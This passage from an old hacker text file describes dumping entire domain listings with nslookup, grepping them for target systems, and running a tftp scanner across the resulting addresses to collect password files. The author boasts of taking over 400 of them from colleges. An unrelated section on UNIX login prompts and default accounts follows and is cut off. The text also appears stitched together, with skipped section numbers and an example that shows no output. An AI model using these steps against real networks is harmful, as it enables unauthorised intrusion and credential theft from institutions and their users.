doing so is to connect via your nslookup client to one of several major domain
name servers located around the net.  In this example, I will use the server
at ns.internic.net.  The following commands should be executed. . .

$ nslookup
Default Server:  ns.domain.com    <-- This is the server for your site
Address:  127.0.0.1

> server ns.internic.net          <-- We will proceed to go to this server
Default Server:  ns.internic.net
Address:  198.41.0.4

	Now that we are in our server, we will continue, and find ourselves
a listing of every educational name server which our base name server knows
about.  By getting this list, we can thus determine the names of the domains.
This same procedure can also be followed for COM, ORG, as well as country
sites, such as IL and PL.  For military and government information, it is
recommended that server nic.ddn.mil be used.

> ls EDU                          <-- All educational name servers.
[ns.internic.net]
 edu.                           server = NS.INTERNIC.NET               
 edu.                           server = AOS.ARL.ARMY.MIL              
 edu.                           server = NS1.ISI.edu                   
 edu.                           server = C.PSI.NET                     
 edu.                           server = TERP.UMD.edu                  
 edu.                           server = NS.NASA.GOV                   
 edu.                           server = NIC.NORDU.NET                 
 edu.                           server = NS.ISC.ORG                    
 edu.                           server = NS.NIC.DDN.MIL                
 caltech                        server = DELILAH.CCSF.CALTECH.edu      
 caltech                        server = SAMPSON.CCSF.CALTECH.edu      
 caltech                        server = TYBALT.CALTECH.edu            
 TYBALT.CALTECH                 131.215.139.100
 caltech                        server = NS1.LBL.GOV                   
 caltech                        server = PUN.CIS.OHIO-STATE.edu        
 caltech                        server = gap.cco.caltech.edu           
 gap.cco.caltech                131.215.139.43
 caltech                        server = gap-gw.cco.caltech.edu        
 gap-gw.cco.caltech             131.215.139.43
 caltech                        server = hot.CALTECH.edu               
 hot.CALTECH                    131.215.9.49

	I have cut out all servers that were given to me except for the top-
level servers, and the caltech servers, for ease of display.  I recommend
that when doing a listing such as this, you output it to a file.  This is
done simply by doing a

> ls EDU > EDU

	This will output to a file called EDU.  The top-level servers listed
above are those servers which our current name server knows of that can also
give similar listings of complete domains.  All secondary servers are mainly
meant to give listings of their sites.  By sorting through our file, EDU,
we can now find out new and different .edu sites that we've never heard of
before.  

	Section 3:  Using Our New Domain Information

	Let us pretend that I have never heard of domain caltech.edu before.
Wow!  It's a new domain!  I wonder what some of it's systems are?  Let's find
out.

$ nslookup
Default Server:  ns.domain.com

	The caltech.edu name server gave us first and foremost a listing of
all other caltech.edu name servers.  This will probably be useless, but
sometimes, if one is patient and bored, one can go through every name server,
and find sites not listed in the base name servers.  However, I find this to
be superfluous, and boring, as stated above.  Anyway, we are also given a list
of every site at caltech.edu.   These sites are real, and we have just 
eliminated the need for ip-scanning to find sites in a given domain.  We have
them all, and we are very happy.  As a side note, for clarity, I have cut
out all but these few sites.  The output files for large sites such as these
can sometimes be well over 150k worth of site names and ip addresses.

	Section 5:  Using Our Sites For Fun and Profit and Other Stuff

	Now we have a huge list of sites.  One may hack them one by one, or
use our big list to find things.  For instance, one can grep through our list
for "dial" and attempt to find dialouts.  Be creative.  Look for decservers,
or whatever types of systems you specialize in hacking by grepping through
lists for their names.  Okay, so this isn't as fun as sex, and won't get you
any monetary profit.  But do it anyway.
	
	Section 5a:   tftp Scanning Using nslookup Output

	I originally taught myself use of the nslookup system in order to
scan tftp.  By using this system, I am able to tftp scan much more quickly,
by only hitting real sites.  On one run, I was tftp scanning 16 colleges at
once for a 10 hour period, and ended up with over 400 password files.
	Step one:  Get nslookup lists of your favorite domains, and output
		   them to files, using the above method.

	Step two:  Cut the first two lines off of your file, using vi, or your
		   favorite editor.  Then, execute the following commands.
		   (domain.edu being our assumed file)

$ cat domain.edu | grep -v server > domain2.edu
	This will remove useless lines.
$ rm domain.edu
$ cat domain2.edu | cut -c1-32 > domain.edu
	This will leave you with only ip numbers.

	Step three:  Utilize the scanner.  I would recommend nohupping it.

$ nohup `bandit domain.edu` &

	Step four:  Wait several hours for the scanner to finish (mattering
		    on domain size.), then harvest your many password files.

UNIX (various flavors, various manufacturers) -

UNIX is easily recognized by it's prompts:

login:
Password:
Login incorrect

There are infinite combinations of possible login prompt setups, /etc/issue
files (which are shown before login), etc.. Nonetheless, UNIX usually
identifies itself quite easily.

Note: the only "default" most UNIX's come with that is usable is root.
However, the following is a list of commonly found accounts. If it is
actually a default, it will be noted what flavor of UNIX it is found on.
